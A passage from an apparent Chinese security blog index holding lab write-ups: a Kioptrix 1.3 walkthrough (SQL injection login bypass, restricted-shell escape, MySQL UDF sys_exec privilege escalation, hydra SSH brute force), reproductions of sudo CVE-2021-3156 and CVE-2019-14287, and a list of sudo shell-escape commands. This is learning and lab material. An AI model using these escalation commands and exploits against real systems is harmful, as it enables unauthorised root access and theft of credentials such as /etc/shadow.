尝试将udf提权相关的利用函数进行删除后重新创建 3、创建sys_eval 函数时提示已经存在，但利用与删除时提示 sys_eval 函数不存在（实战无法解决，漏洞复现可以）。** 原因是上一个人利用过后，数据库进行了重启。 之后重启mysqld服务器，再创建就可以了。 4、ERROR 1126 (HY000) Can't open shared library 'udf.dll' (errno: 193 ) 在进行udf提权时碰到这个错误一般是ufd文件位数选择错误，尝试另一个位数的udf文件。 2.8 修复建议 1、mysql配置文件中secure_file_priv项设置为NULL或非 mysql/lib/plugin目录。 2、数据库用户确保正确实施最小权限原则。 0x03 Linux-UDF提权 Linux环境下的UDF提权大概率仅限于靶场环境中，原因： 在Linux严格的系统权限下，mysql用户或web用户无plugin目录的写入权限。 Linux环境下的udf提权除利用条件外与Windows环境下完全相同。 利用条件：除windows篇中的内容外，还需要plugin目录的写入权限。 因此这里我也找文章复现了，只能说遇到的话在研究吧。 下次学习一番逃逸restricted shell，但似乎这类文章不好找┭┮﹏┭┮ 0x04 参考文章 【数据库提权系列】—【Mysql-UDF提权篇】 [mysql udf提权 ] --webshell+udf提权可以看这篇","tags":["数据库提权系列"],"categories":["内网渗透"]},{"title":"vulnhub-kioptrix_level 1.3","path":"/2023/09/24/kioptrix-level-1.3/","content":"0x01 靶场信息 地址：https://www.vulnhub.com/entry/kioptrix-level-1-1,22/ 发布日期：2010 年 2 月 17 日 难度：容易 目标：获取root shell 描述：This Kioptrix VM Image are easy challenges. The object of the game is to acquire root access via any means possible (except actually hacking the VM server or player). The purpose of these games are to learn the basic tools and techniques in vulnerability assessment and exploitation. There are more ways then one to successfully complete the challenges. Source: http://www.kioptrix.com/blog/?page_id=135 Source: http://www.kioptrix.com/blog/?p=49 ![image-20230924185658114](kioptrix_level 1.3/image-20230924185658114.png) 这里在搭建也是费点脑子，这里如上图下载好rar包之后发现只有一个vmdx的文件，这里需要我们先在虚拟机上创建一个空的 ![image-20230924185745215](kioptrix_level 1.3/image-20230924185745215.png) ![image-20230924185756615](kioptrix_level 1.3/image-20230924185756615.png) 这里选择其他即可 ![image-20230924185811593](kioptrix_level 1.3/image-20230924185811593.png) 这里放在合适的地方，安装好后进入虚拟机设置中，将原先的硬盘删除掉，换成我们下载好的vmdx文件即可 ![image-20230924185924521](kioptrix_level 1.3/image-20230924185924521.png) 下载好打开即可，可能再打开的时候会报错，他会提示让我们换成如下图的配置 ![image-20230924190011738](kioptrix_level 1.3/image-20230924190011738.png) 我们照做即可 0x02 信息收集 探测存活主机 netdiscover -r 192.168.17.0/24 ![image-20230924191700887](kioptrix_level 1.3/image-20230924191700887.png) 那目标机就是192.168.17.145了 端口扫描 nmap -sS -sV -A -p 1-65535 192.168.17.143 ![image-20230924192157892](kioptrix_level 1.3/image-20230924192157892.png) 可以看到有如上四个端口的开启，我们先访问80看看 ![image-20230924192223848](kioptrix_level 1.3/image-20230924192223848.png) 如图是一个登录平台，我们先看一下web目录 web目录扫描 dirsearch -u \"http://192.168.17.145\" -x 400-599 -t 50 Target: http://192.168.17.145/ [19:25:29] Starting: [19:25:51] 200 - 109B - /checklogin [19:25:52] 200 - 109B - /checklogin.php [19:25:54] 200 - 298B - /database.sql [19:26:00] 200 - 933B - /images/ [19:26:01] 301 - 356B - /images -&gt; http://192.168.17.145/images/ [19:26:01] 200 - 1KB - /index.php [19:26:02] 200 - 1KB - /index.php/login/ [19:26:02] 200 - 1KB - /index [19:26:05] 302 - 0B - /logout -&gt; index.php [19:26:05] 302 - 0B - /logout.php -&gt; index.php [19:26:05] 302 - 0B - /logout/ -&gt; index.php [19:26:07] 302 - 220B - /member -&gt; index.php [19:26:07] 302 - 220B - /member/login.jsp -&gt; index.php [19:26:07] 302 - 220B - /member/login.aspx -&gt; index.php [19:26:07] 302 - 220B - /member/logon -&gt; index.php [19:26:07] 302 - 220B - /member/login.rb -&gt; index.php [19:26:07] 302 - 220B - /member/login.html -&gt; index.php [19:26:07] 302 - 220B - /member/ -&gt; index.php [19:26:07] 302 - 220B - /member/login -&gt; index.php [19:26:07] 302 - 220B - /member/admin.asp -&gt; index.php [19:26:07] 302 - 220B - /member/login.py -&gt; index.php [19:26:07] 302 - 220B - /member/login.php -&gt; index.php [19:26:07] 302 - 220B - /member/login.js -&gt; index.php [19:26:07] 302 - 220B - /member.php -&gt; index.php [19:26:07] 302 - 220B - /member/signin -&gt; index.php [19:26:07] 302 - 220B - /member/login.asp -&gt; index.php 测试一番发现如下信息： database.sql： CREATE TABLE `members` ( `id` int(4) NOT NULL auto_increment, `username` varchar(65) NOT NULL default '', `password` varchar(65) NOT NULL default '', PRIMARY KEY (`id`) ) TYPE=MyISAM AUTO_INCREMENT=2 ; -- -- Dumping data for table `members` -- INSERT INTO `members` VALUES (1, 'john', '1234'); 估计是sql注入了 web网站指纹扫描 whatweb http://192.168.17.145 ![image-20230924193046254](kioptrix_level 1.3/image-20230924193046254.png) 此处似乎没什么重要信息，但回过头来看了看sql泄露的信息 0x03 漏洞发现及利用 万能密码登录获取用户信息 INSERT INTO `members` VALUES (1, 'john', '1234'); 我瞬间就认为这可能是登录页面的信息，但试了试没啥用，接着便没思路了，于是看了wp发现是我的dirsearch扫的不行，使用kali自带的dirb竟然还能扫到一个john后缀的url。。。。话不多说我们访问看看 ![image-20230924195229960](kioptrix_level 1.3/image-20230924195229960.png) ![image-20230924195250034](kioptrix_level 1.3/image-20230924195250034.png) ![image-20230924195507516](kioptrix_level 1.3/image-20230924195507516.png) 好吧没什么卵用，接着wp说尝试弱口令，但我之前也尝试了却没成功，还是怪自己经验少而且没耐心吧┭┮﹏┭┮ 然后我跟着教程走，发现还是不行？？？结果换一个浏览器就好了，真实玄学，看来又多了一个经验 john 'or'1'='1 我们输入如上信息，即可得到用户信息 ![image-20230924200000467](kioptrix_level 1.3/image-20230924200000467.png) 接下来我又不知道干嘛了，要不是看wp我又忘了可以尝试一下ssh连接的。。。 ![image-20230924200233909](kioptrix_level 1.3/image-20230924200233909.png) 但成功登陆之后奇怪的是什么命令也不能执行。。。，仔细一看发现这里似乎是自定义了一些命令符 ![image-20230924200358200](kioptrix_level 1.3/image-20230924200358200.png) 如图输入?或者help能查看可以使用什么命令，不过 还是很鸡肋，我用遍了也不知道有啥有效信息，看了wp发现又是知识盲区了，他这里采用了一种提权方法，其实我也应该往这里想的，即使我不会，但得有想法 mysql-udf 提权 echo os.system(\"/bin/bash\") #输出bash命令行 cd /var/www cat checklogin.php ![image-20230924201147686](kioptrix_level 1.3/image-20230924201147686.png) 因为菜的缘故，我不理解他echo命令的操作原理，于是GPT问了一番，果然AI就是好，百度没找到的，我一下子就透彻了 这行代码看起来是用Python的`os.system`函数在Linux系统中执行了一个命令`/bin/bash`。让我来解释一下： 1. `echo`: 这是一个Linux命令，用于在终端中打印文本。在这里，它被用作一个外部命令，会打印`os.system(\"/bin/bash\")`这个字符串到终端。 2. `os.system(\"/bin/bash\")`: 这部分是Python代码，它调用了`os.system`函数，该函数用于在操作系统中执行外部命令。在这里，传递给`os.system`函数的参数是`\"/bin/bash\"`，这是一个Linux系统中的命令解释器，也就是Bash Shell。 综合起来，这行代码的作用是在Linux系统中打印字符串`os.system(\"/bin/bash\")`到终端，并尝试执行`/bin/bash`，也就是启动一个新的Bash Shell进程。这样，如果运行这段代码，你将会看到该字符串被打印到终端，并且你会进入一个新的Bash Shell，可以在其中执行其他命令和操作。请注意，执行这段代码需要足够的权限，因为它尝试启动一个新的Shell。这种代码使用得当，可以用于调用其他系统命令，但也需要小心，以免滥用或造成安全问题。 以上为GPT回答，总的来说，echo命令行调用了system命令来执行/bin/bash，于是启动了一个新的shell进程，恰好启动之后我们便可以使用更多的linux系统命令了—理解止步于此，请佬们嘴下留情┭┮﹏┭┮ 这里 跟着步骤看一个check源码 &lt;?php ob_start(); $host=\"localhost\"; // Host name $username=\"root\"; // Mysql username $password=\"\"; // Mysql password $db_name=\"members\"; // Database name $tbl_name=\"members\"; // Table name // Connect to server and select databse. mysql_connect(\"$host\", \"$username\", \"$password\")or die(\"cannot connect\"); mysql_select_db(\"$db_name\")or die(\"cannot select DB\"); // Define $myusername and $mypassword $myusername=$_POST['myusername']; $mypassword=$_POST['mypassword']; // To protect MySQL injection (more detail about MySQL injection) $myusername = stripslashes($myusername); //$mypassword = stripslashes($mypassword); $myusername = mysql_real_escape_string($myusername); //$mypassword = mysql_real_escape_string($mypassword); //$sql=\"SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'\"; $result=mysql_query(\"SELECT * FROM $tbl_name WHERE username='$myusername' and password='$mypassword'\"); //$result=mysql_query($sql); // Mysql_num_row is counting table row $count=mysql_num_rows($result); // If result matched $myusername and $mypassword, table row must be 1 row if($count!=0){ // Register $myusername, $mypassword and redirect to file \"login_success.php\" session_register(\"myusername\"); session_register(\"mypassword\"); header(\"location:login_success.php?username=$myusername\"); } else { echo \"Wrong Username or Password\"; print('&lt;form method=\"link\" action=\"index.php\"&gt;&lt;input type=submit value=\"Try Again\"&gt;&lt;/form&gt;'); } ob_end_flush(); ?&gt; 可以看到上述代码只对username做了参数过滤，并没有限制password，这也是万能密码成功的原因，并且我们也可以看到数据库配置信息，看了wp，发现接下来就可以想到mysql数据库提权了 由于不熟悉mysql命令，就cv过来了 ![image-20230924202012411](kioptrix_level 1.3/image-20230924202012411.png) 这里登录的时候密码默认为空，接下来佬又毫无理由的输入了一下命令，┭┮﹏┭┮ mysql -uroot -p select sys_exec(\"usermod -aG admin john\"); exit 以下是GPT 回答 select: 这是一个 SQL 查询语句的起始部分，表示你要执行一个查询操作。通常，select 用于从数据库中检索数据。 sys_exec(\"usermod -aG admin john\"): 这是一个 SQL 查询中的函数调用，其中调用了一个名为 sys_exec 的自定义函数，并传递了一个参数 \"usermod -aG admin john\" 给该函数。根据函数名和参数的形式，可以推断出这个函数的作用是执行系统命令。 \"usermod -aG admin john\" 是一个 Linux 系统命令，用于将用户 john 添加到 admin 用户组。这个命令通常用于管理用户和用户组的权限。 如果你的数据库支持并配置了 sys_exec 函数，并且具有足够的权限来执行系统命令，那么执行这个 SQL 查询将尝试执行 usermod -aG admin john 命令，将用户 john 添加到 admin 用户组中。 我们发现执行如上命令便可以将john加入到admin用户组了 ![image-20230924202337538](kioptrix_level 1.3/image-20230924202337538.png) 顺便解释一下上述命令各个参数的含义，我也复习复习，GPT回答： 当解释命令 `usermod -aG admin john` 时，我们需要分解和解释各个参数的含义： 1. `usermod`: 这是一个 Linux 命令，用于修改用户帐户的属性。它的主要功能是管理用户帐户的属性，例如更改用户名、密码、家目录等。 2. `-aG`: 这是 `usermod` 命令的选项和参数，具体含义如下： - `-a`: 这个选项表示追加（append）。当与 `-G` 选项一起使用时，它指示将用户添加到一个或多个附加的用户组中，而不会将其从其他组中删除。如果省略了 `-a` 选项，用户将被从其他组中移除，并且只会属于新指定的组。 - `-G admin`: 这个部分表示将用户添加到名为 `admin` 的用户组中。在 Linux 中，用户可以同时属于一个或多个用户组。这个命令将用户 `john` 添加到 `admin` 用户组，这可能用于授予用户 `john` 某些管理员权限或访问某些系统资源的权限。 3. `john`: 这是要修改的用户的用户名。在这种情况下，`usermod` 命令将对用户名为 `john` 的用户执行操作。 综合起来，这个命令的含义是将用户 `john` 添加到 `admin` 用户组，而不会从任何其他组中删除他。这通常用于管理用户的权限，以便他可以访问 `admin` 组的资源或执行需要 `admin` 组权限的操作，而不影响其在其他组的成员资格。 找到flag sudo su root 密码：MyNameIsJohn cd ~ cat congrats.txt ![image-20230924202451357](kioptrix_level 1.3/image-20230924202451357.png) 0x04 靶场总结 靶场echo命令探索 本着对知识的渴望与对自己学习的负责，我继续搜寻了上述echo os.system(\"/bin/bash\")的含义，功夫不负有心人，我发现在此次靶场环境中，之所以当前用户使用的命令极其有限，是因为他处于一个lshell的环境，看这意思应该是limit shell 对其简单的介绍： Linux受限shell软件lshell限制用户行为： 有时我们需要限制登录到Linux系统用户的行为，最简单的办法莫过于限制其所能执行的命令。 Lshell是另一款可以实现这个功能的软件，是由Python编写。 接着搜了半天如何\"突破受限制的shell环境\"发现都没有包含上述方法，也就放弃了，只需将此方法记住吧。 nikto漏扫初识 在这里我发现有篇文章用的是nikto方法，这里我也没接触过，于是简单了解了一下 Nikto是一个开源的WEB扫描评估软件，可以对Web服务器进行多项安全测试，能在230多种服务器上扫描出 2600多种有潜在危险的文件、CGI及其他问题。Nikto使用Perl语言编写运行，Nikto可以扫描指定主机的WEB类型、主机名、指定目录、特定CGI漏洞、返回主机允许的 http模式等. 具体可以参考：Web漏洞扫描神器Nikto使用指南 Kali-扫描工具-Nikto使用 SMB 枚举 这里又发现一个新姿势 根据端口信息发现存在 SMB 服务，使用 enum4linux 对其进行枚举：enum4linux 192.168.17.145 ![image-20230924210740235](kioptrix_level 1.3/image-20230924210740235.png) 很神奇，直接发现了三个用户 未获取到 smb 版本号，但枚举出用户名：root、robert、john、loneferret 你以为就这样结束了？ 用户名也可通过 nmap 进行枚举：nmap -T4 --script=smb-enum-users 192.168.17.145 ![image-20230924210912765](kioptrix_level 1.3/image-20230924210912765.png) 接着佬又执行如下操作 尝试对四个账户进行 ssh 暴破： hydra -L u.txt -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-1000.txt 192.168.146.132 ssh 暴破失败，此思路仅供参考。 还有一点，便是在此之前的sql注入漏洞中，我们尝试在用户名或者密码处添加单引号会发现页面会有报错信息，这时候就应该极度注意了，但我却没有┭┮﹏┭┮ 0x05 文章总结 总的来说，在此次靶场中思路依旧用上一个靶场，框架并没发生大的改变，但令我印象深刻的有： 1. 各种工具的使用（都未见过）比如nikto漏扫，SMB服务枚举处用户名，甚至nmap也可以枚举，唉还是太菜，什么都不知道，接着浅浅了解了一下hydra的ssh密码爆破 2. 这里便是网站的手工漏洞判断了，这次给我的教训有，一定一定要关注任何登录框，因为他极有可能存在sql注入，倘若没有发现，那大概率也是因为我菜不会判断，而这次的sql漏洞中，明明我都手工测试的时候看到了页面的报错信息，但我却选择无视，其实这已经说明了存在sql注入。 3. 同时这也有在提示我，未来要学会去搭建配置属于自己的强大字典，不然就学会利用各种扫描工具来间接丰富字典内容。不过前者肯定更完美。 4. 最后便是一些提权类的内容，这令我有点头疼，但即使知识体系庞大，我也不可退缩，比如这次边了解到了，如何突破受限制的shell环境、以及mysql的udf提权。虽然本文未做介绍但我会记录一下学习的文章，在此之后进行学习。 我将在下次靶场之前进一步学习udf提权以及逃逸restricted shell 0x06 参考文章 渗透技巧——如何逃逸Linux的受限制shell执行任意命令 CTF靶场系列-Kioptrix全集 [CTF靶场之Kioptrix: Level 1.3] Kioptrix: Level 1.3 --极度推荐 VulnHub – Kioptrix：1.3 级演练","tags":["内网靶场"],"categories":["vulnhub系列"]},{"title":"CVE-2021-3156-sudo 提权漏洞复现","path":"/2023/09/24/cve-2021-3156-sudo-ti-quan-lou-dong-fu-xian/","content":"0x01 漏洞简介 ​ Sudo是一个功能强大的实用程序，大多数基于Unix和Linux的操作系统都包含Sudo。它允许用户使用其他用户的安全特权运行程序。2021年1月27日，国外安全研究人员披露了Sudo 堆缓冲区溢出致本地提权漏洞，漏洞编号为 CVE-2021-3156。任何本地用户（包括普通用户和系统用户，sudoer和非sudoers）若成功利用该漏洞，可在无需密码的情况下获得root权限。 产生原理 一个类 Unix 操作系统在命令参数中转义反斜杠时存在基于堆的缓冲区溢出漏洞。 当 sudo 通过 -s 或 -i 命令行选项在 shell 模式下运行命令时，它将在命令参数中使用反斜杠转义特殊字符。但使用 -s 或 -i 标志运行 sudoedit 时，实际上并未进行转义，从而可能导致缓冲区溢出。只要存在 sudoers 文件（通常是 /etc/sudoers），攻击者就可以使用本地普通用户利用 sudo 获得系统 root 权限。 0x02 影响范围 Sudo 1.8.2 - 1.8.31p2 Sudo 1.9.0 - 1.9.5p1 测试系统是否易受此漏洞影响： 1.以非root用户身份登录系统。 2.运行命令“sudoedit -s /” 3.如果出现以“ sudoedit：”开头的错误响应，则系统受到此漏洞影响； 如果出现以“ usage：”开头的错误响应，则表示该漏洞已被补丁修复。 ![image-20230924105530740](CVE-2021-3156-sudo 提权漏洞复现/image-20230924105530740.png) 怎么说，我这个应该也是存在的吧。。。。 0x03 漏洞复现 这里采用kali远程 ssh连接ubuntu系统，不过ubuntu得提前开启22端口，开启方法可参考：ubuntu开启22端口 ![image-20230924110103036](CVE-2021-3156-sudo 提权漏洞复现/image-20230924110103036.png) 成功链接 在普通用户权限上，输入：sudoedit -s / 输了才发现，ubuntu没漏洞，fuck，接着看了我的centos发现存在。 参考：CentOS 开启22号端口 ![image-20230924110728825](CVE-2021-3156-sudo 提权漏洞复现/image-20230924110728825.png) 接着输入上述命令 ![image-20230924110812687](CVE-2021-3156-sudo 提权漏洞复现/image-20230924110812687.png) 如果显示sudoedit: /: not a regular file，则表示该漏洞存在 下载漏洞poc： https://haxx.in/CVE-2021-3156_nss_poc_ubuntu.tar.gz ![image-20230924111716439](CVE-2021-3156-sudo 提权漏洞复现/image-20230924111716439.png) 这里我用的git下载 ，不过这得看目标机是否有git命令，否则看看能否使用wget等等，或者尝试下载git命令（不过一般得有root权限才可以） 上传poc到目标服务器，给予权限，然后执行 make &amp;&amp;./sudo-hax-me-a-sandwich 0 这里又发现一堆报错，解决无果后，还是直接docker拉取一个环境算了 ![image-20230924114457954](CVE-2021-3156-sudo 提权漏洞复现/image-20230924114457954.png) 查看一下版本，接着检测漏洞 ![image-20230924114523250](CVE-2021-3156-sudo 提权漏洞复现/image-20230924114523250.png) ok，存在漏洞，接着用poc打一下 ![image-20230924114709781](CVE-2021-3156-sudo 提权漏洞复现/image-20230924114709781.png) ![image-20230924114738607](CVE-2021-3156-sudo 提权漏洞复现/image-20230924114738607.png) 用的是id为1000的test账户执行exp，执行完之后用户权限已经变成了root，成功提权，到这里所有的漏洞复现准备工作都做完了，接下来进行漏洞分析 不过感觉这种方式少点味道，接下来介绍一下我上述出问题的那种方法 上传poc到目标服务器，给予权限，然后执行 make &amp;&amp;./sudo-hax-me-a-sandwich 0 ![image-20230924115108314](CVE-2021-3156-sudo 提权漏洞复现/image-20230924115108314.png) 有#表示漏洞利用成功。查看是否是root权限 ![image-20230924115123776](CVE-2021-3156-sudo 提权漏洞复现/image-20230924115123776.png) 0x04 漏洞总结 ​ 本漏洞利用手法有一定的堆布局难度，最后的提权是通过堆溢出覆盖nss_load_library函数加载so的时候需要用到的结构体service_user，覆盖此结构体中的so名字符串，这样就可以让程序加载我们指定的so文件，从而完成任意代码执行。 0x05 漏洞修复 看似该漏洞很nice，其实依然需要一定权限执行make命令，且只危害Ubuntu、Debian系统，或许我上述的报错就是make没权限吧。。。 建议及时升级sudo至最新版本。 0x06 参考文章 CVE-2021-3156本地提权漏洞复现 CVE-2021-3156 漏洞复现笔记 —漏洞源码分析参考 linux中sudo提权漏洞复现及修复-CVE-2021-3156 CVE-2021-3156 sudo 本地提权漏洞复现 linux 提权-sudo提权","tags":["CVE"],"categories":["CVE漏洞"]},{"title":"CVE-2019-14287：sudo权限绕过漏洞","path":"/2023/09/24/cve-2019-14287-sudo-quan-xian-rao-guo-lou-dong-fu-xian/","content":"0x01 漏洞概述 有的用户可能知道，如果将sudo配置为允许用户通过Runas规范中定义的ALL关键字来以任意用户身份运行命令的话，那么攻击者将有可能通过制定用户ID -1或4294967295来以root权限执行恶意命令。 实际上，只要用户的权限足够高，即拥有最高sudo权限的用户，并且在Runas规范中定义了ALL关键字的话，他们就可以运行Runas规范中明确禁止使用的那些root命令，而且以这种方式运行的命令其日志项所显示的目标用户为4294967295，而不是root。与此同时，在执行相应命令的过程中，PAM会话模块将不会运行。 Sudo 的全称是“superuserdo”，它是Linux系统管理指令，允许用户在不需要切换环境的前提下以其它用户的权限运行应用程序或命令。通常以 root 用户身份运行命令，是为了减少 root 用户的登录和管理时间，同时提高安全性。 2019年10月14日，Sudo官方发布了Sudo 1.8.28版本，其中包含sudo root权限绕过漏洞（CVE-2019-14287）的补丁修复。 0x02 影响范围 sudo 1.8.28 之前的所有版本 0x03 漏洞分析 这里就跟着佬的思路走一遍，清楚原理即可 一般情况下，大多数Linux发行版的Runas规范（/etc /sudoers）都如下图所示，其中定义的ALL关键字将允许admin或sudo组中的用户以目标系统中的任意用户身份来运行命令： 如果想利用该漏洞来实施攻击，用户需要拥有sudo权限，并允许用户使用任意用户ID来运行命令。通常来说，这意味着用户的sudoer项在Runas规范中定义了特殊的ALL值。 如果sudoer策略允许的话，sudo支持由用户指定的用户名或用户ID来运行命令。比如说，下列sudoer项允许我们以任意用户的身份来运行id命令，因为在Runas规范中它包含了ALL关键字。 alice myhost = (ALL) /usr/bin/id 除了以任意有效用户的身份运行id命令之外，我们还能够以任意用户ID来运行该命令，此时需要使用#uid语句： sudo -u#1234 id -u 该命令将返回“1234”。但是，sudo可以使用setresuid(2)和setreuid(2)这两个系统调用，来在命令运行之前修改用户ID，并将用户ID修改为-1（或未签名的等价用户ID-4294967295）： sudo -u#-1 id -u 或 sudo -u#4294967295 id -u 上述命令运行之后，将返回“0”。这是因为sudo命令本身已经在以用户ID“0”运行了，所以当sudo尝试将用户ID修改为“-1”时，不会发生任何变化。 但是，sudo日志条目中记录下的命令运行用户的ID为“4294967295”，而并非root用户（或用户ID为“0”），除此之外，因为用户ID是通过-u选项指定的，并且不会在密码数据库中存储，所以PAM会话模块也不会运行。 如果sudoer条目允许用户以任意用户身份运行命令（非root），那么攻击者就可以利用该漏洞来绕过这种限制了。比如说，我们有下列sudoer条目： bob myhost = (ALL, !root) /usr/bin/vi 用户bob能够以除了root之外的其他任意用户身份来运行命令vi，但由于该漏洞的存在，bob实际上能够通过下列命令来以root权限运行vi命令，并绕过目标系统中的安全策略： sudo -u#-1 vi 只有当包含了ALL关键词的sudoer条目存在于Runas规范中时，该漏洞才存在。比如说，如果规范中包含下列sudoer条目的话，目标系统是不会受到该漏洞影响的： alice myhost = /usr/bin/id 在上述例子中，alice只能够以root权限运行id命令，任何以不同身份用户运行命令的尝试都将被拒绝。 攻击场景截图： 0x04 漏洞复现 这里我采用centos，很幸运，我的centos存在如上漏洞 首先查询sudo版本：sudo -V 创建用户 useradd test //创建用户 passwd test //设置用户的密码 编辑下sudoers文件 这里添加了 hacker ALL=(ALL, !root) /usr/bin/vim 这里表示 hacker 可以在任意主机上、任何用户，但这个用户不能属于root组，执行vim命令 这里介绍下字段含义： 授权用户/组 主机=[(切换到哪些用户或组)][是否需要输入密码验证] 命令1,命令2 第一个字段表示：授权用户/组&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 不以%开头的，代表“将要授权的用户”&nbsp;&nbsp;&nbsp;&nbsp; 以%开头的表示“将要授权的组” 第二个字段表示：允许登录的主机 第三个字段表示：可以切换到的用户或者组，省略表示切换到root。&nbsp;&nbsp; 如果不省略需要用括号表示&nbsp;&nbsp; (用户:组) 第四个字段表示：若添加NOPASSWD表示不需要输入密码，如果省略则表示需要输入密码 第五个字段表示：可以运行的命令 我们用hacker用户登录下cnetos，并尝试读取shadow文件 然后我们输入 sudo -u#-1 vim 或者 sudo -u#4294967295 vim 这里不知为何翻车了，估计是系统问题，这里先展示成功画面吧 进入到vim，在命令模式下尝试读取/etc/shadow文件 成功读取，同样也可以用vim执行其他的命令（以root身份） 0x05 漏洞修复 1.之所以会产生这个漏洞，是因为将用户 ID 转换为用户名的函数会将 -1（或无效的 4294967295）误认为是 0，而这正好是 root 用户 User ID 2.请将 sudo 升级到 1.8.28 最新版本，该漏洞会影响 1.8.28 之前的所有版本。 0x06 参考文章 CVE-2019-14287：sudo权限绕过漏洞分析与复现 CVE-2019-14287：sudo 权限绕过漏洞（复现过程） linux 提权-sudo提权","tags":["CVE"],"categories":["CVE漏洞"]},{"title":"linux 提权-sudo提权","path":"/2023/09/23/linux-ti-quan-sudo-ti-quan/","content":"0x01 前言 此次为vulnhub靶场中所不熟悉的知识点，借此来学习一番 0x02 sudo简介 sodo 全称 Substitute User and Do，用来临时赋予root权限运行某个程序，是linux系统管理指令，是允许系统管理员让普通用户执行一些或者全部的root命令的一个工具，如halt，reboot，su等等。换句话说通过此命令可以让非root的用户运行只有root才有权限执行的命令。 sudo 的执行原理： 普通用户执行命令时，首先检查/var/run/sudo/目录下是否有用户时间戳，centos检查/var/db/sudo/目录，并检查是否过期。 如果时间戳过期，就需要输入当前用户的密码。输入后检查/etc/sudoers配置文件，查看用户是否有sudo权限，如果有，执行sudo命令并返回结果，然后退出sudo返回到普通用户的shell环境。 而在/etc/sudoers中设置可执行sudo指令的用户。默认只有root。 ![image-20230923214502376](linux 提权-sudo提权/image-20230923214502376.png) 是不是每一个新创建的用户都可以使用sudo提升命令的权限呢？如果不是那么哪些用户可以使用此命令呢？要想使一个用户具有使用sudo的能力，需要让root用户将其名字、可以执行的特定命令、按照哪种用户或用户组的身份执行等信息注册到/etc/sudoers文件中，即完成对该用户的授权（此时该用户称为“sudoer”）才可以。 当一般用户执行特殊权限时，在命令前加上 sudo，此时系统会让你输入密码以确认终端机前操作的是你本人，确认后系统会将该命令的进程以超级用户的权限运行。 在一定的时间段内，再次执行sudo的命令时不再询问密码，超出此时间段（一般为5分钟）后需要再次输入密码。 在Linux/Unix中，/etc/sudoers文件是sudo权限的配置文件，其中储存了一些用户或组可以以root权限使用的命令。如下图![image-20230924091340555](linux 提权-sudo提权/image-20230924091340555.png) 0x03 Sudoer文件语法 3.1 给用户赋予全部root权限 找到root权限root ALL=(ALL:ALL) ALL，在下一行输入\" test ALL(ALL:ALL) ALL \"，保存后退出，这样即表示用户test可以使用sudo调用root权限执行命令。即此时test用户相当于root了 ![image-20230924091502925](linux 提权-sudo提权/image-20230924091502925.png) 3.2 给予用户部分权限 hacker用户就能使用awk命令了 ![image-20230924091531982](linux 提权-sudo提权/image-20230924091531982.png) 3.3 查看用户能以root权限运行的命令 sudo -l //一般都得输入当前用户的密码才可以使用 0x04 sudo 常规提权 如果攻击者知道当前用户密码，就可以利用sudo执行命令提权。 如： 可以利用sudo提权的命令如下 wget、find、cat、apt、zip、xxd、time、taskset、git、sed、pip、ed、tmux、scp、perl、bash、less、awk、man、vi、env、ftp、ed、screen 添加部分命令用于测试sudo提权 vim /etc/sudoers hacker ALL=(root) NOPASSWD: /usr/bin/awk hacker ALL=(root) NOPASSWD: /usr/bin/vim hacker ALL=(root) NOPASSWD: /usr/bin/man hacker ALL=(root) NOPASSWD: /usr/bin/apache2 hacker ALL=(root) NOPASSWD: /usr/bin/less hacker ALL=(root) NOPASSWD: /bin/more hacker ALL=(root) NOPASSWD: /usr/bin/find hacker ALL=(root) NOPASSWD: /usr/bin/zip hacker ALL=(root) NOPASSWD: /usr/bin/git ![image-20230924093750842](linux 提权-sudo提权/image-20230924093750842.png) 假设获取了一个普通用户hacker的权限，接着利用sudo进行提权 这里我们先切换到hacker用户 sudo useradd -m hacker //创建新用户 sudo passwd hacker //给用户设置密码 su hacker //转到新用户下 4.1 awk 命令提权 查看sudo - ![image-20230924094304256](linux 提权-sudo提权/image-20230924094304256.png) 显示了允许当前用户使用的命令，如下发现了可以以root权限执行awk命令并且不需要密码 权限提升 执行下面代码直接切换到root用户了，无需密码 sudo awk 'BEGIN{system(\"/bin/bash\")}' ![image-20230924094409631](linux 提权-sudo提权/image-20230924094409631.png) 4.2 find 命令提权 sudo find . -exec /bin/sh \\; -quit ![image-20230923214734214](linux 提权-sudo提权/image-20230923214734214.png) 4.3 git 命令提权 sudo git help add ![image-20230924100456480](linux 提权-sudo提权/image-20230924100456480.png) 如上图，回车之后输入!/bin/bash，获得权限 ![image-20230924100549094](linux 提权-sudo提权/image-20230924100549094.png) 4.4 ed 命令提权 sudo ed 之后 !/bin/sh ![image-20230924100904152](linux 提权-sudo提权/image-20230924100904152.png) 4.5 python 命令提权 sudo python -c 'import pty;pty.spawn(\"/bin/bash\")' ![image-20230923214759200](linux 提权-sudo提权/image-20230923214759200.png) ![image-20230923215240847](linux 提权-sudo提权/image-20230923215240847.png) 这里centos与kali都试了一下，发现kali不需要登录密码，不过转头一想这应该就是kali我刚提权了一下，存在的时间戳还未过期而已 或者管理员在/etc/sudoers配置了某些命令免密码使用。 如设置apt-get命令sudo时不需要密码。 cseroad ALL=(ALL:ALL) NOPASSWD:/usr/bin/apt-get cseroad表示用户名 第一个 ALL 指示允许从任何终端访问sudo 第二个 (ALL:ALL)指示sudo命令被允许任意用户、任意组执行 第三个 NOPASSWD 表示不需要输入密码而可以sudo执行的命令 再进行测试，sudo python等命令需要密码，而设置的apt-get不需要密码。 ![image-20230923220942463](linux 提权-sudo提权/image-20230923220942463.png) 这里我却翻车了，我这里是需要密码的，或许是我的配置文件不是一般的（^_^） 不过我们明白其中原理即可，接下来是上述方法成功的结果 ![image-20230924090729032](linux 提权-sudo提权/image-20230924090729032.png) 那就可以不需要输入密码利用apt-get命令来提权。 ![image-20230924090742973](linux 提权-sudo提权/image-20230924090742973.png) 但是想获取哪些命令设置了无密码sudo，还是需要查看cat /etc/sudoers文件或者sudo -l命令，而这两条命令都需要一定权限或者知道当前用户密码。 ![image-20230924090832054](linux 提权-sudo提权/image-20230924090832054.png) 果不其然，有点鸡肋 更多命令sudo提权参考：https://gtfobins.github.io/ 总的来说这些提权方法都是随机应变，只要清楚当下用户的权限情况，找到对应方法即可。 0x05 实战体验 这里就单独放两篇文章来写吧 5.1 CVE-2019-14287 5.2 CVE-2021-3156 0x06 参考文章 Linux提权之sudo提权 sudo提权 linux 提权-sudo提权","tags":["Linux 提权"],"categories":["内网渗透"]},{"title":"vulnhub-kioptrix_level 1.2","path":"/2023/09/23/kioptrix-level-1.2/","content":"0x01 前言 